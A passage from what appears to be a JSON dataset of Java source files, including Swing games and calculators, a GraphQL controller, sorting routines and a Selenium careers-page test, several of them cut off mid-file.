       int minimo = 1;\n                int range = maximo - minimo + 1;\n                int numeroSorteado;\n\n                if (numerosSorteados.size() == range) {\n                    JOptionPane.showMessageDialog(null, \"Todos os n\u00fameros foram sorteados!\");\n                    UIManager.put(\"OptionPane.yesButtonText\", \"Sim\");\n                    UIManager.put(\"OptionPane.noButtonText\", \"N\u00e3o\");\n                    \n                    quantidadeNumerosComboBox.setEnabled(true);\n\n                    int resposta = JOptionPane.showConfirmDialog(null, \"Deseja fazer um novo sorteio?\",\n                            \"Novo Sorteio\", JOptionPane.YES_NO_OPTION);\n                    if (resposta == JOptionPane.YES_OPTION) {\n                        numerosSorteados.clear();\n                        ultimoNum.setText(\"0\");\n                        numSorteados.setText(\"\");\n                    } else {\n                        System.exit(0);\n                    }\n                } else {\n                    do {\n                        numeroSorteado = (int) (Math.random() * range) + minimo;\n                    } while (numerosSorteados.contains(numeroSorteado));\n\n                    numerosSorteados.add(numeroSorteado);\n                    ultimoNum.setText(Integer.toString(numeroSorteado));\n                    StringBuilder sb = new StringBuilder();\n                    for (int i = 0; i < numerosSorteados.size(); i++) {\n                        sb.append(numerosSorteados.get(i));\n                        if (i != numerosSorteados.size() - 1) {\n                            sb.append(\" - \");\n                        }\n                    }\n                    numSorteados.setText(sb.toString());\n                }\n\n            }\n        });\n\n\n        botao.setBounds(160, 100, 90, 25);\n        contentPane.add(botao);\n        numSorteados.setFont(new Font(\"Tahoma\", Font.ITALIC, 15));\n        numSorteados.setBounds(10, 251, 414, 150);\n        contentPane.add(numSorteados);\n\n        JLabel lblNewLabel = new JLabel(\"BINGO\");\n        lblNewLabel.setHorizontalAlignment(SwingConstants.CENTER);\n        lblNewLabel.setFont(new Font(\"Verdana\", Font.BOLD, 30));\n        lblNewLabel.setBounds(150, 11, 115, 45);\n        contentPane.add(lblNewLabel);\n\n        JLabel lblNewLabel_1 = new JLabel(\"N\u00fameros Sorteados:\");\n        lblNewLabel_1.setFont(new Font(\"Tahoma\", Font.PLAIN, 13));\n        lblNewLabel_1.setBounds(10, 226, 125, 14);\n        contentPane.add(lblNewLabel_1);\n\n        JLabel lblNe",
    "package MODEL;\n\npublic class Student {\n    private String id;\n    private String fullName;\n    private String dateOfBirth;\n    private String department;\n    private int approved;\n\n    public Student() {\n    }\n\n    public Student(String id, String fullName, String dateOfBirth, String department, int approved) {\n        this.id = id;\n        this.fullName = fullName;\n        this.dateOfBirth = dateOfBirth;\n        this.department = department;\n        this.approved = approved;\n    }\n\n    public String getId() {\n        return id;\n    }\n\n    public void setId(String id) {\n        this.id = id;\n    }\n\n    public String getFullName() {\n        return fullName;\n    }\n\n    public void setFullName(String fullName) {\n        this.fullName = fullName;\n    }\n\n    public String getDateOfBirth() {\n        return dateOfBirth;\n    }\n\n    public void setDateOfBirth(String dateOfBirth) {\n        this.dateOfBirth = dateOfBirth;\n    }\n\n    public String getDepartment() {\n        return department;\n    }\n\n    public void setDepartment(String department) {\n        this.department = department;\n    }\n\n    public int getApproved() {\n        return approved;\n    }\n\n    public void setApproved(int approved) {\n        this.approved = approved;\n    }\n    \n}\n",
    "package org.pshenai.graphbass.controllers;\n\nimport org.pshenai.graphbass.entities.item.ItemEntity;\nimport org.pshenai.graphbass.entities.item.ItemService;\nimport org.pshenai.graphbass.entities.item.ItemType;\nimport org.pshenai.graphbass.entities.manufacturer.ManufacturerEntity;\nimport org.pshenai.graphbass.entities.manufacturer.ManufacturerService;\nimport org.springframework.graphql.data.method.annotation.Argument;\nimport org.springframework.graphql.data.method.annotation.MutationMapping;\nimport org.springframework.stereotype.Controller;\n\nimport java.util.UUID;\n\n@Controller\npublic class ItemController {\n\n    private final ItemService service;\n    private final ManufacturerService manufacturerService;\n\n    public ItemController(ItemService service, ManufacturerService manufacturerService) {\n        this.service = service;\n        this.manufacturerService = manufacturerService;\n    }\n\n    @MutationMapping\n    ItemEntity addItem(@Argument ItemInput item){\n        ManufacturerEntity manufacturer = manufacturerService.getManufacturer(item.manufacturerId());\n\n        return service.saveItem(new ItemEntity(item.itemName(), ItemType.valueOf(item.itemType()), item.price(), item.quantity(), manufacturer));\n    }\n\n    record ItemInput(String itemName, String itemType, String price, int quantity, UUID manufacturerId) {}\n}\n",
    "import java.util.*;\n\npublic class Generic {\n    public static void main(String[] args) {\n        Random ran = new Random();\n        Integer[] array = new Integer[100];\n        for (int i = 0; i < array.length; i++) {\n            array[i] = ran.nextInt(1000);\n        }\n\n        insertionSort(array);\n        System.out.println(Arrays.toString(array));\n    }\n\n    // Linear search\n    public static <T extends Comparable<T>> int linearSearch(T[] arr, T value) {\n        for (int i = 0; i < arr.length; i++) {\n            if (arr[i].compareTo(value) == 0) {\n                return i;\n            }\n        }\n        return -1;\n    }\n\n    // Binary search\n    public static <T extends Comparable<T>> int binarySearchNoRecursive(T[] arr, T value) {\n        int start = 0;\n        int end = arr.length - 1;\n        while (start <= end) {\n            int mid = start + (end - start) / 2;\n            if (arr[mid].compareTo(value) > 0) {\n                end = mid - 1;\n            } else if (arr[mid].compareTo(value) < 0) {\n                start = mid + 1;\n            } else {\n                return mid;\n            }\n        }\n        return -1;\n    }\n\n    // Bubble sort\n    public static <T extends Comparable<T>> void bubbleSort(T[] arr) {\n        boolean isNextPass = true;\n        for (int i = 1; i < arr.length && isNextPass; i++) {\n            isNextPass = false;\n            for (int j = 0; j < arr.length - i; j++) {\n                if (arr[j].compareTo(arr[j + 1]) > 0) {\n                    isNextPass = true;\n                    T temp = arr[j];\n                    arr[j] = arr[j + 1];\n                    arr[j + 1] = temp;\n                }\n            }\n        }\n    }\n\n    // Selection sort\n    public static <T extends Comparable<T>> void selectionSort(T[] arr) {\n        for (int i = 0; i < arr.length - 1; i++) {\n            int indexMin = i;\n            T valueMin = arr[i];\n            for (int j = i + 1; j < arr.length; j++) {\n                if (arr[j].compareTo(valueMin) < 0) {\n                    indexMin = j;\n                    valueMin = arr[j];\n                }\n            }\n            arr[indexMin] = arr[i];\n            arr[i] = valueMin;\n        }\n    }\n\n    // Insertion sort\n    public static <T extends Comparable<T>> void insertionSort(T[] arr) {\n        for (int i = 1; i < arr.length; i++) {\n            T currentValue = arr[i];\n            int j;\n            for (j = i - 1; j >= 0 && currentValue.compareTo(arr[j]) <= 0; j--) {\n                arr[j + 1] = arr[j];\n            }\n            arr[j + 1] = currentValue;\n        }\n    }\n}",
    "package com.labcorp.career;\n\nimport org.junit.*;\n\nimport static org.junit.Assert.*;\nimport static org.hamcrest.CoreMatchers.is;\nimport static org.hamcrest.core.IsNot.not;\n\nimport org.junit.jupiter.api.Assertions;\nimport org.junit.jupiter.api.MethodOrderer;\nimport org.junit.jupiter.api.Order;\nimport org.junit.jupiter.api.TestMethodOrder;\nimport org.junit.runners.MethodSorters;\nimport org.openqa.selenium.By;\nimport org.openqa.selenium.WebDriver;\nimport org.openqa.selenium.chrome.ChromeDriver;\nimport org.openqa.selenium.Dimension;\nimport org.openqa.selenium.WebElement;\nimport org.openqa.selenium.interactions.Actions;\nimport org.openqa.selenium.support.ui.ExpectedConditions;\nimport org.openqa.selenium.support.ui.WebDriverWait;\nimport org.openqa.selenium.JavascriptExecutor;\nimport org.openqa.selenium.Alert;\nimport org.openqa.selenium.Keys;\nimport java.util.*;\n\nimport java.util.concurrent.TimeUnit;\n//@FixMethodOrder(MethodSorters.NAME_ASCENDING)\n@TestMethodOrder(MethodOrderer.OrderAnnotation.class)\npublic class CareerTest {\n    static WebDriver driver;\n    static Map<String, Object> vars;\n    //  String jobID;\n\n    static String jobLocation2;\n    static String jobID;\n    JavascriptExecutor js;\n\n\n\n    @BeforeClass\n    public  static void setUp() {\n        System.setProperty(\"webdriver.chrome.driver\", \"C:\\\\Users\\\\dutta003\\\\eclipse-workspace1\\\\ADEPCentral\\\\src\\\\test\\\\resources\\\\chromedriver.exe\");\n        driver = new ChromeDriver();\n        JavascriptExecutor js = (JavascriptExecutor) driver;\n        vars = new HashMap<String, Object>();\n    }\n\n    @AfterClass\n    public  static void  tearDown() {\n        driver.quit();\n    }\n\n    public  String waitForWindow(int timeout) {\n        try {\n            Thread.sleep(timeout);\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n        Set<String> whNow = driver.getWindowHandles();\n        Set<String> whThen = (Set<String>) vars.get(\"window_handles\");\n        if (whNow.size() > whThen.size()) {\n            whNow.removeAll(whThen);\n        }\n        return whNow.iterator().next();\n    }\n\n    public  String getElementText(By locator) {\n        WebElement locatorElement = driver.findElement(locator);\n        return locatorElement.getText();\n    }\n\n    @Test\n    @Order(1)\n    public  void CareersTest() throws InterruptedException {\n\n        driver.get(\"https://www.labcorp.com/\");\n        driver.manage().window().setSize(new Dimension(1920, 1032));\n        driver.manage().timeouts().implicitlyWait(2000, TimeUnit.SECONDS);\n\n        WebDriverWait wait = new WebDriverWait(driver, 2000);\n        wait.until(ExpectedConditions.visibilityOfElementLocated(By.linkText(\"Careers\")));\n        assertThat(driver.findElement(By.linkText(\"Careers\")).getText(), is(\"Careers\"));\n        driver.findElement(By.linkText(\"Careers\")).click();\n\n\n        wait.until(ExpectedConditions.visibilityOfElementLocated(By.id(\"typehead\")));\n        driver.findElement(By.id(\"typehead\")).click();\n        driver.findElement(By.id(\"typehead\")).sendKeys(\"java developer\");\n        wait.until(ExpectedConditions.visibilityOfElementLocated(By.id(\"typehead\")));\n        driver.findElement(By.id(\"typehead\")).sendKeys(Keys.ENTER);\n\n        wait.until(ExpectedConditions.visibilityOfElementLocated(By.xpath(\"/html/body/div[2]/div[2]/div/div/div/div[2]/section[3]/div/div/div/div[2]/div[2]/ul/li[1]/div[1]/span/a/div/span\")));\n\n        SeleniumTest obt1 = new SeleniumTest();\n        //SeleniumTest testObj = new SeleniumTest();\n        jobID = getElementText(By.xpath(\"/html/body/div[2]/div[2]/div/div/div/div[2]/section[3]/div/div/div/div[2]/div[2]/ul/li[1]/div[1]/p/span[5]/span/span[2]\"));\n        System.out.println(\"jobID:: \" + jobID);\n\n        String jobLocation = getElementText(By.xpath(\"/html/body/div[2]/div[2]/div/div/div/div[2]/section[3]/div/div/div/div[2]/div[2]/ul/li[1]/div[1]/p/span[3]/span\"));\n        System.out.println(\"jobLocation:: \" + jobLocation);\n        String jobLocation1 = jobLocation.substring(9, 15);\n        jobLocation2 = jobLocation1 + \" NC\";\n\n        String jobTitle = getElementText(By.xpath(\"/html/body/div[2]/div[2]/div/div/div/div[2]/section[3]/div/div/div/div[2]/div[2]/ul/li[1]/div[1]/span/a/div/span\"));\n        System.out.println(\"jobTitle: :\" + jobTitle);\n\n        // WebElement button2 =driver.findElement(By.xpath(\" //*[@id=\\\"input-43\\\"]\"));\n\n        wait.until(ExpectedConditions.elementToBeClickable(By.xpath(\"/html/body/div[2]/div[2]/div/div/div/div[2]/section[3]/div/div/div/div[2]/div[2]/ul/li[1]/div[1]/span/a/div/span\")));\n\n        driver.findElement(By.xpath(\"/html/body/div[2]/div[2]/div/div/div/div[2]/section[3]/div/div/div/div[2]/div[2]/ul/li[1]/div[1]/span/a/div/span\")).click();\n\n    }\n\n\n    @Test\n    @Order(2)\n    public  void appicationformTest() throws InterruptedException {\n        JavascriptExecutor js = (JavascriptExecutor) driver;\n        driver.manage().timeouts().implicitlyWait(2000, TimeUnit.SECONDS);\n        assertThat(driver.findElement(By.xpath(\"/",
    "/*\n * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license\n * Click nbfs://nbhost/SystemFileSystem/Templates/GUIForms/JDialog.java to edit this template\n */\npackage serialisasi;\n\nimport java.util.ArrayList;\nimport java.util.List;\nimport javax.swing.JOptionPane;\nimport javax.swing.table.DefaultTableModel;\n/**\n *\n * @author LENOVO_ITL6\n */\npublic class AddProduct extends javax.swing.JDialog {\n    DefaultTableModel model;\n    /**\n     * Creates new form AddProduct\n     */\n    public AddProduct(java.awt.Frame parent, boolean modal) {\n        super(parent, modal);\n        initComponents();\n        \n        initTable();\n    }\n    \n    private void initTable() {\n    model = new javax.swing.table.DefaultTableModel(\n        new Object [][] {},\n        new String [] {\"NAMA ITEM\", \"HARGA ITEM\"}\n    );\n    tabelItem.setModel(model);\n    }\n\n\n    /**\n     * This method is called from within the constructor to initialize the form.\n     * WARNING: Do NOT modify this code. The content of this method is always\n     * regenerated by the Form Editor.\n     */\n    @SuppressWarnings(\"unchecked\")\n    // <editor-fold defaultstate=\"collapsed\" desc=\"Generated Code\">//GEN-BEGIN:initComponents\n    private void initComponents() {\n\n        jLabel1 = new javax.swing.JLabel();\n        jLabel2 = new javax.swing.JLabel();\n        txtId = new javax.swing.JTextField();\n        txtNamaProduct = new javax.swing.JTextField();\n        jPanel1 = new javax.swing.JPanel();\n        jLabel3 = new javax.swing.JLabel();\n        jLabel4 = new javax.swing.JLabel();\n        txtNamaItem = new javax.swing.JTextField();\n        txtHargaItem = new javax.swing.JTextField();\n        btnTambah = new javax.swing.JButton();\n        jScrollPane1 = new javax.swing.JScrollPane();\n        tabelItem = new javax.swing.JTable();\n        btnSimpan = new javax.swing.JButton();\n\n        setDefaultCloseOperation(javax.swing.WindowConstants.DISPOSE_ON_CLOSE);\n\n        jLabel1.setText(\"ID PRODUK\");\n\n        jLabel2.setText(\"NAMA PRODUK\");\n\n        txtId.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                txtIdActionPerformed(evt);\n            }\n        });\n\n        jPanel1.setBorder(javax.swing.BorderFactory.createTitledBorder(null, \"ITEM PRODUK\", javax.swing.border.TitledBorder.CENTER, javax.swing.border.TitledBorder.DEFAULT_POSITION));\n        jPanel1.setToolTipText(\"\");\n\n        jLabel3.setText(\"NAMA ITEM\");\n\n        jLabel4.setText(\"HARGA ITEM\");\n\n        txtNamaItem.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                txtNamaItemActionPerformed(evt);\n            }\n        });\n\n        btnTambah.setText(\"TAMBAH\");\n        btnTambah.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                btnTambahActionPerformed(evt);\n            }\n        });\n\n        tabelItem.setModel(new javax.swing.table.DefaultTableModel(\n            new Object [][] {\n                {null, null, null, null},\n                {null, null, null, null},\n                {null, null, null, null},\n                {null, null, null, null}\n            },\n            new String [] {\n                \"Title 1\", \"Title 2\", \"Title 3\", \"Title 4\"\n            }\n        ));\n        jScrollPane1.setViewportView(tabelItem);\n\n        javax.swing.GroupLayout jPanel1Layout = new javax.swing.GroupLayout(jPanel1);\n        jPanel1.setLayout(jPanel1Layout);\n        jPanel1Layout.setHorizontalGroup(\n            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGroup(jPanel1Layout.createSequentialGroup()\n                .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n                    .addGroup(jPanel1Layout.createSequentialGroup()\n                        .addGap(39, 39, 39)\n                        .addComponent(jLabel3))\n                    .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, jPanel1Layout.createSequentialGroup()\n                        .addContainerGap()\n                        .addComponent(jLabel4)))\n                .addGap(18, 18, 18)\n                .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n                    .addComponent(txtNamaItem, javax.swing.GroupLayout.DEFAULT_SIZE, 142, Short.MAX_VALUE)\n                    .addComponent(txtHargaItem))\n                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)\n                .addComponent(btnTambah)\n                .addGap(30, 30, 30))\n            .addGroup(jPanel1Layout.createSequentialGroup()\n                .addContainerGap()\n                .addComponent(jScrollPane1, javax.swing.GroupLayout.PREFERRED_SIZE, 0, Short.MAX_VALUE)\n                .addContainerGap())\n        );\n        jPanel1Layo",
    "package com.my016.arithmetic.lab2.api;\n\npublic class Charger implements ICharger{\n    /**\n     * \u5c06\u5145\u7535\u5668\u8fde\u63a5\u5230\u4ea4\u6d41\u7535\u6e90\u4e0a\n     * @param voltage \u4ea4\u6d41\u7535\u7535\u538b\n     * @return \u5f53voltage\u5728[200-240]V\u8303\u56f4\u65f6\uff0c\u8fd4\u56detrue,\u5426\u5219\u8fd4\u56defalse\n     */\n    @Override\n    public boolean connectPowerline(float voltage) {\n        if (!(voltage>=200 && voltage<=240)){\n            System.out.print(\"\u4ea4\u6d41\u7535\u538b\u4e0d\u5728[200,240]\u8303\u56f4,\u65e0\u6cd5\u5145\u7535\");\n        }\n        return voltage>=200 && voltage<=240;\n    }\n\n    /**\n     * \u5173\u7535\uff0c\u505c\u6b62\u5145\u7535\n     */\n    @Override\n    public void powerOff() {\n        System.out.print(\"\u5145\u7535\u5668\u505c\u6b62\u5145\u7535\");\n    }\n\n    /**\n     * \u7ed9\u624b\u673a\u5145\u7535\uff0c\u8c03\u7528\u8be5\u65b9\u6cd51\u6b21\uff0c\u5145\u75355%\n     * @param currentEnergy \u624b\u673a\u7535\u6c60\u73b0\u6709\u7535\u91cf\uff0c[0-100]\u95f4\u7684\u6570\n     * \u82e5\u7535\u91cf\u4e3a100\uff08\u6ee1\u7535\uff09\uff0c\u5219\u505c\u6b62\u5145\u7535\uff0c\u81ea\u52a8\u8c03\u7528powerOff\n     * @return \u5145\u7535\u540e\u7684\u7535\u6c60\u7535\u91cf\uff0c\u82e5currentEnergy\u4e3a10\uff0c\u5219\u8fd4\u56de10+5=15\n     */\n    @Override\n    public int doCharge(int currentEnergy) {\n        if (currentEnergy >= 95){\n            System.out.println(\"\u5df2\u5145\u7535\u5230100%\");\n            powerOff();\n            return 100;\n        }\n        System.out.println(\"\u5df2\u5145\u7535\u5230\"+(currentEnergy+5)+\"%\");\n\n        return currentEnergy+5;\n    }\n}\n",
    "import java.awt.EventQueue;\r\nimport javax.swing.JFrame;\r\nimport java.awt.BorderLayout;\r\nimport javax.swing.JPanel;\r\n//import javax.swing.border.BevelBorder;\r\nimport javax.swing.border.LineBorder;\r\nimport java.awt.Color;\r\nimport java.awt.GridLayout;\r\nimport javax.swing.JLabel;\r\nimport javax.swing.JOptionPane;\r\nimport javax.swing.JButton;\r\nimport java.awt.Font;\r\nimport javax.swing.SwingConstants;\r\nimport javax.swing.JTextField;\r\nimport java.awt.event.ActionListener;\r\nimport java.awt.event.ActionEvent;\r\n\r\npublic class Tac {\r\n\r\n\tprivate JFrame frame;\r\n\tprivate JTextField xCount;\r\n\tprivate JTextField oCount;\r\n\tprivate int xCount1 =0;\r\n\tprivate int oCount1 =0;\r\n\tprivate String startGame = \"X\";\r\n\tprivate int b1 = 10;\r\n\tprivate int b2 = 10;\r\n\tprivate int b3 = 10;\r\n\tprivate int b4 = 10;\r\n\tprivate int b5 = 10;\r\n\tprivate int b6 = 10;\r\n\tprivate int b7 = 10;\r\n\tprivate int b8 = 10;\r\n\tprivate int b9 = 10;\r\n\tprivate int i = 0;\r\n\t\r\n\tpublic static void main(String[] args) {\r\n\t\tEventQueue.invokeLater(new Runnable() {\r\n\t\t\tpublic void run() {\r\n\t\t\t\ttry {\r\n\t\t\t\t\tTac window = new Tac();\r\n\t\t\t\t\twindow.frame.setVisible(true);\r\n\t\t\t\t} catch (Exception e) {\r\n\t\t\t\t\te.printStackTrace();\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t});\r\n\t}\r\n\r\n\tpublic Tac() {\r\n\t\tinitialize();\r\n\t}\r\n\t\r\n\tprivate void choosePlayer() {\r\n\t\tif(startGame.equalsIgnoreCase(\"X\")) {\r\n\t\t\tstartGame = \"O\";\r\n\t\t}\r\n\t\telse {\r\n\t\t\tstartGame = \"X\";\r\n\t\t}\r\n\t}\r\n\r\n\tprivate void winningGame() {\r\n\t\tif(b1==1 && b2 == 1 && b3 == 1) {\r\n\t\t\tJOptionPane.showMessageDialog(frame, \"Player X wins\",\"Tac\",JOptionPane.INFORMATION_MESSAGE);\r\n\t\t\txCount1++;\r\n\t\t\txCount.setText(String.valueOf(xCount1));\r\n\t\t}\r\n\t\telse if(b4==1 && b5 == 1 && b6 == 1) {\r\n\t\t\tJOptionPane.showMessageDialog(frame, \"Player X wins\",\"Tac\",JOptionPane.INFORMATION_MESSAGE);\r\n\t\t\txCount1++;\r\n\t\t\txCount.setText(String.valueOf(xCount1));\r\n\t\t}\r\n\t\telse if(b7==1 && b8 == 1 && b9 == 1) {\r\n\t\t\tJOptionPane.showMessageDialog(frame, \"Player X wins\",\"Tac\",JOptionPane.INFORMATION_MESSAGE);\r\n\t\t\txCount1++;\r\n\t\t\txCount.setText(String.valueOf(xCount1));\r\n\t\t}\r\n\t\telse if(b1==1 && b4 == 1 && b7 == 1) {\r\n\t\t\tJOptionPane.showMessageDialog(frame, \"Player X wins\",\"Tac\",JOptionPane.INFORMATION_MESSAGE);\r\n\t\t\txCount1++;\r\n\t\t\txCount.setText(String.valueOf(xCount1));\r\n\t\t}\r\n\t\telse if(b2==1 && b5 == 1 && b8 == 1) {\r\n\t\t\tJOptionPane.showMessageDialog(frame, \"Player X wins\",\"Tac\",JOptionPane.INFORMATION_MESSAGE);\r\n\t\t\txCount1++;\r\n\t\t\txCount.setText(String.valueOf(xCount1));\r\n\t\t}\r\n\t\telse if(b3==1 && b6 == 1 && b9 == 1) {\r\n\t\t\tJOptionPane.showMessageDialog(frame, \"Player X wins\",\"Tac\",JOptionPane.INFORMATION_MESSAGE);\r\n\t\t\txCount1++;\r\n\t\t\txCount.setText(String.valueOf(xCount1));\r\n\t\t}\r\n\t\telse if(b1==1 && b5 == 1 && b9 == 1) {\r\n\t\t\tJOptionPane.showMessageDialog(frame, \"Player X wins\",\"Tac\",JOptionPane.INFORMATION_MESSAGE);\r\n\t\t\txCount1++;\r\n\t\t\txCount.setText(String.valueOf(xCount1));\r\n\t\t}\r\n\t\telse if(b7==1 && b5 == 1 && b3 == 1) {\r\n\t\t\tJOptionPane.showMessageDialog(frame, \"Player X wins\",\"Tac\",JOptionPane.INFORMATION_MESSAGE);\r\n\t\t\txCount1++;\r\n\t\t\txCount.setText(String.valueOf(xCount1));\r\n\t\t}\r\n\t\t// only for o player \r\n\t\telse if(b1==0 && b2 == 0 && b3 == 0) {\r\n\t\t\tJOptionPane.showMessageDialog(frame, \"Player O wins\",\"Tac\",JOptionPane.INFORMATION_MESSAGE);\r\n\t\t\toCount1++;\r\n\t\t\toCount.setText(String.valueOf(oCount1));\r\n\t\t}\r\n\t\telse if(b4==0 && b5 == 0 && b6 == 0) {\r\n\t\t\tJOptionPane.showMessageDialog(frame, \"Player O wins\",\"Tac\",JOptionPane.INFORMATION_MESSAGE);\r\n\t\t\toCount1++;\r\n\t\t\toCount.setText(String.valueOf(oCount1));\r\n\t\t}\r\n\t\telse if(b7==0 && b8 == 0 && b9 == 0) {\r\n\t\t\tJOptionPane.showMessageDialog(frame, \"Player O wins\",\"Tac\",JOptionPane.INFORMATION_MESSAGE);\r\n\t\t\toCount1++;\r\n\t\t\toCount.setText(String.valueOf(oCount1));\r\n\t\t}\r\n\t\telse if(b1==0 && b4 == 0 && b7 == 0) {\r\n\t\t\tJOptionPane.showMessageDialog(frame, \"Player O wins\",\"Tac\",JOptionPane.INFORMATION_MESSAGE);\r\n\t\t\toCount1++;\r\n\t\t\toCount.setText(String.valueOf(oCount1));\r\n\t\t}\r\n\t\telse if(b2==0 && b5 == 0 && b8 == 0) {\r\n\t\t\tJOptionPane.showMessageDialog(frame, \"Player O wins\",\"Tac\",JOptionPane.INFORMATION_MESSAGE);\r\n\t\t\toCount1++;\r\n\t\t\toCount.setText(String.valueOf(oCount1));\r\n\t\t}\r\n\t\telse if(b3==0 && b6 == 0 && b9 == 0) {\r\n\t\t\tJOptionPane.showMessageDialog(frame, \"Player O wins\",\"Tac\",JOptionPane.INFORMATION_MESSAGE);\r\n\t\t\toCount1++;\r\n\t\t\toCount.setText(String.valueOf(oCount1));\r\n\t\t}\r\n\t\telse if(b1==0 && b5 == 0 && b9 == 0) {\r\n\t\t\tJOptionPane.showMessageDialog(frame, \"Player O wins\",\"Tac\",JOptionPane.INFORMATION_MESSAGE);\r\n\t\t\toCount1++;\r\n\t\t\toCount.setText(String.valueOf(oCount1));\r\n\t\t}\r\n\t\telse if(b7==0 && b5 == 0 && b3 == 0) {\r\n\t\t\tJOptionPane.showMessageDialog(frame, \"Player O wins\",\"Tac\",JOptionPane.INFORMATION_MESSAGE);\r\n\t\t\toCount1++;\r\n\t\t\toCount.setText(String.valueOf(oCount1));\r\n\t\t}\r\n\t\telse if(i==8) {\r\n\t\t\tJOptionPane.showMessageDialog(frame, \"No one wins\",\"Tac\",JOptionPane.INFORMATION_MESSAGE);\r\n\t\t}\r\n\t}\r\n\r\n\tprivate void initialize() {\r\n\t\tframe = new JFrame();\r\n\t\tframe.setBounds(100, 100, 600, 400);\r\n\t\tframe.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\r\n\t\tframe.getContentPane().se",
    "/*\n * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license\n * Click nbfs://nbhost/SystemFileSystem/Templates/GUIForms/JFrame.java to edit this template\n */\npackage mx.edu.cesba;\n\n/**\n *\n * @author Eduardo\n */\npublic class CalculadoraCientificaCESBA extends javax.swing.JFrame {\n\n    float num1, num2;\n    String signo;\n    boolean decimal = false;\n    /**\n     * Creates new form DemoCal\n     */\n    public CalculadoraCientificaCESBA() {\n        initComponents();\n    }\n\n    /**\n     * This method is called from within the constructor to initialize the form.\n     * WARNING: Do NOT modify this code. The content of this method is always\n     * regenerated by the Form Editor.\n     */\n    @SuppressWarnings(\"unchecked\")\n    // <editor-fold defaultstate=\"collapsed\" desc=\"Generated Code\">//GEN-BEGIN:initComponents\n    private void initComponents() {\n\n        jPanel1 = new javax.swing.JPanel();\n        etiqueta_1 = new javax.swing.JLabel();\n        txt_output = new javax.swing.JLabel();\n        btn_C = new javax.swing.JButton();\n        btn_X = new javax.swing.JButton();\n        btn_divicion = new javax.swing.JButton();\n        btn_resta = new javax.swing.JButton();\n        btc_suma = new javax.swing.JButton();\n        btc_igual = new javax.swing.JButton();\n        btc_1 = new javax.swing.JButton();\n        btc_2 = new javax.swing.JButton();\n        btc_3 = new javax.swing.JButton();\n        btc_4 = new javax.swing.JButton();\n        btc_5 = new javax.swing.JButton();\n        btc_6 = new javax.swing.JButton();\n        btc_7 = new javax.swing.JButton();\n        btc_8 = new javax.swing.JButton();\n        btc_9 = new javax.swing.JButton();\n        btc_0 = new javax.swing.JButton();\n        btc_punto = new javax.swing.JButton();\n        borraruno = new javax.swing.JButton();\n        porcentaje = new javax.swing.JButton();\n        btc_Pi = new javax.swing.JButton();\n        btc_cuadrado = new javax.swing.JButton();\n        btc_raiz_cubica = new javax.swing.JButton();\n        btc_raiz = new javax.swing.JButton();\n        btc_sin = new javax.swing.JButton();\n        btc_cos = new javax.swing.JButton();\n        btc_tan = new javax.swing.JButton();\n        btc_log = new javax.swing.JButton();\n        btc_factorial = new javax.swing.JButton();\n        btc_euler = new javax.swing.JButton();\n\n        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);\n        setResizable(false);\n\n        jPanel1.setBackground(new java.awt.Color(204, 204, 255));\n\n        etiqueta_1.setFont(new java.awt.Font(\"Cambria\", 0, 14)); // NOI18N\n        etiqueta_1.setForeground(new java.awt.Color(51, 51, 255));\n        etiqueta_1.setText(\"CALCULADORA CIENTIFICA CESBA\");\n\n        txt_output.setBackground(new java.awt.Color(204, 204, 204));\n        txt_output.setFont(new java.awt.Font(\"Book Antiqua\", 0, 48)); // NOI18N\n        txt_output.setHorizontalAlignment(javax.swing.SwingConstants.RIGHT);\n        txt_output.setBorder(new javax.swing.border.SoftBevelBorder(javax.swing.border.BevelBorder.RAISED));\n\n        btn_C.setText(\"C\");\n        btn_C.setBorder(null);\n        btn_C.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                btn_CActionPerformed(evt);\n            }\n        });\n\n        btn_X.setText(\"x\");\n        btn_X.setBorder(null);\n        btn_X.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                btn_XActionPerformed(evt);\n            }\n        });\n\n        btn_divicion.setText(\"/\");\n        btn_divicion.setBorder(null);\n        btn_divicion.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                btn_divicionActionPerformed(evt);\n            }\n        });\n\n        btn_resta.setText(\"-\");\n        btn_resta.setBorder(null);\n        btn_resta.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                btn_restaActionPerformed(evt);\n            }\n        });\n\n        btc_suma.setText(\"+\");\n        btc_suma.setBorder(null);\n        btc_suma.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                btc_sumaActionPerformed(evt);\n            }\n        });\n\n        btc_igual.setText(\"=\");\n        btc_igual.setBorder(null);\n        btc_igual.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                btc_igualActionPerformed(evt);\n            }\n        });\n\n        btc_1.setText(\"1\");\n        btc_1.setBorder(null);\n        btc_1.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                btc",
